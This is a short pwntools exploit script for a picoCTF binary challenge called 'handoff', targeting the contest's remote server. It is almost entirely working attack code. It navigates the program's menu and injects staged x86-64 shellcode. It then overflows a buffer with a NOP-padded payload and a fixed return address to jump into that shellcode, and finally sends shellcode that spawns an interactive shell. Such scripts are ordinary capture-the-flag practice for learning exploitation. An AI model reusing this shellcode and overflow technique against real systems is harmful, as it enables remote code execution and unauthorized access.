from pwn import *

# Set up the binary and context
elf = context.binary = ELF('./handoff')

# Connect to the remote server
p = remote('shape-facility.picoctf.net', 52893)

# Define the first stage shellcode
shellcode = asm('''
    xor rsi, rsi
    push 0
    pop rax
    xor rdi, rdi
    mov rsi, rsp
    push 0x64
    pop rdx
    syscall
    jmp rsp
''')

# Define the second stage shellcode
newshellcode = asm('''
    sub rax, 716
    jmp rax
    jmp rax
''')

# Interact with the program
p.sendlineafter(b'app', b'1')
p.sendlineafter(b'name:', b'name')
p.sendlineafter(b"app", b"2")
p.sendlineafter(b'to?', b'0')
p.sendlineafter(b'them?', shellcode)

# Prepare the payload
payload = newshellcode
payload += asm('nop') * (20 - len(payload))
payload += p64(0x401014)

# Send the payload
p.sendlineafter(b'app', b'3')
p.sendlineafter(b'it:', payload)

# Send the final shellcode to spawn a shell
p.sendline(asm(shellcraft.sh()))

# Switch to interactive mode
p.interactive()
